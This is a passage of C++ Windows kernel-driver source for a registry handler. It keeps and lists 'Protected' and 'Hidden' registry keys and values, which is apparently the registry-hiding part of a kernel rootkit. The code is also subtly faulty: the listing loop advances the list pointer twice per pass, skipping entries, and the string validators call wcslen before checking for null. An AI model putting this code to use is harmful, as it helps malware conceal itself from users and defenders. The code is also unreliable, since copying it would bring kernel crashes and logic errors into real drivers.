		break;
	case RegItemType::All:
		ClearList<RegistryEntryList, RegItem>(&this->keysList.Protected);
		ClearList<RegistryEntryList, RegItem>(&this->keysList.Hidden);
		ClearList<RegistryEntryList, RegItem>(&this->valuesList.Protected);
		ClearList<RegistryEntryList, RegItem>(&this->valuesList.Hidden);
		break;
	default:
		break;
	}
}

/*
* Description:
* ListRegistryItems is responsible for listing the registry items of a specific type.
*
* Parameters:
* @list	  [_Inout_ IoctlRegistryList*] -- Registry list to fill.
*
* Returns:
* @bool								   -- Whether successfully got or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool RegistryHandler::ListRegistryItems(_Inout_ IoctlRegistryList* list) {
	PLIST_ENTRY currentEntry = nullptr;
	SIZE_T count = 0;
	errno_t err = 0;
	RegItem* item = nullptr;
	RegistryEntryList* registryList = nullptr;
	MemoryGuard regGuard = MemoryGuard();

	if (!list)
		return false;

	switch (list->Type) {
		case RegItemType::ProtectedKey:
			registryList = &this->keysList.Protected;
			break;
		case RegItemType::HiddenKey:
			registryList = &this->keysList.Hidden;
			break;
		case RegItemType::ProtectedValue:
			registryList = &this->valuesList.Protected;
			break;
		case RegItemType::HiddenValue:
			registryList = &this->valuesList.Hidden;
			break;
		default:
			return false;
	}
	 
	AutoLock locker(registryList->Lock);

	if (registryList->Count == 0) {
		list->Count = 0;
		return true;
	}
	if (list->Count != registryList->Count) {
		list->Count = registryList->Count;
		return true;
	}
	MemoryGuard listGuard(list->Items, static_cast<ULONG>(sizeof(IoctlRegItem) * registryList->Count), UserMode);

	if (!listGuard.IsValid())
		return false;
	currentEntry = registryList->Items;

	while (currentEntry->Flink != registryList->Items && count < registryList->Count) {
		currentEntry = currentEntry->Flink;
		item = CONTAINING_RECORD(currentEntry, RegItem, Entry);

		if (item) {
			list->Items[count].Type = item->Type;

			if (!regGuard.GuardMemory(list->Items[count].KeyPath, REG_KEY_LEN, UserMode))
				return false;
			err = wcscpy_s(list->Items[count].KeyPath, REG_KEY_LEN, item->KeyPath);
			regGuard.UnguardMemory();

			if (err != 0)
				return false;

			if (list->Type == RegItemType::ProtectedValue || list->Type == RegItemType::HiddenValue) {
				if (!regGuard.GuardMemory(list->Items[count].ValueName, REG_VALUE_LEN, UserMode))
					return false;
				err = wcscpy_s(list->Items[count].ValueName, REG_VALUE_LEN, item->ValueName);
				regGuard.UnguardMemory();

				if (err != 0)
					return false;
			}
		}
		count++;
		currentEntry = currentEntry->Flink;
	}

	return true;
}

/*
* Description:
* GetKeyObject is responsible for getting the key object from the info object.
* 
* Parameters:
* @infoObject [_In_ PVOID]				  -- Info object from the registry operation.
* @keyPath	  [_Inout_ PCUNICODE_STRING*] -- The key path will be written there.
* 
* Returns:
* @bool									  -- Whether successfully got or not.
*/
_IRQL_requires_(PASSIVE_LEVEL)
bool RegistryHandler::GetKeyObject(_In_ PVOID infoObject, _Inout_ PCUNICODE_STRING* keyPath) {
	NTSTATUS status = STATUS_SUCCESS;

	if (!infoObject || !IsValidKmMemory(reinterpret_cast<ULONG64>(infoObject)))
		return false;

	if (regCookie.QuadPart == 0)
		return false;

	__try {
		status = CmCallbackGetKeyObjectIDEx(&regCookie, infoObject, nullptr, keyPath, 0);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return false;
	}

	if (!NT_SUCCESS(status)) {
		if (keyPath)
			CmCallbackReleaseKeyObjectIDEx(*keyPath);
		return false;
	}
	return true;
}

_IRQL_requires_max_(DISPATCH_LEVEL)
bool RegistryHandler::IsValidKey(_In_ const UNICODE_STRING* key) const {
	return key->Buffer && key->Length > 0 && key->Length <= key->MaximumLength && 
		key->Length / sizeof(wchar_t) < REG_KEY_LEN && IsValidKmMemory(reinterpret_cast<ULONG64>(key->Buffer));
}

_IRQL_requires_max_(DISPATCH_LEVEL)
bool RegistryHandler::IsValidKey(_In_ const wchar_t* key) const {
	size_t keyLength = wcslen(key);
	return key && keyLength > 0 && keyLength < REG_KEY_LEN;
}

_IRQL_requires_max_(DISPATCH_LEVEL)
bool RegistryHandler::IsValidValue(_In_ const UNICODE_STRING* value) const {
	return value->Buffer && value->Length > 0 && value->Length <= value->MaximumLength && 
		value->Length / sizeof(wchar_t) < REG_VALUE_LEN && 
		IsValidKmMemory(reinterpret_cast<ULONG64>(value->Buffer));
}

_IRQL_requires_max_(DISPATCH_LEVEL)
bool RegistryHandler::IsValidValue(_In_ const wchar_t* value) const {
	size_t valueLength = wcslen(value);
	return value && valueLength > 0 && valueLength < REG_VALUE_LEN;
}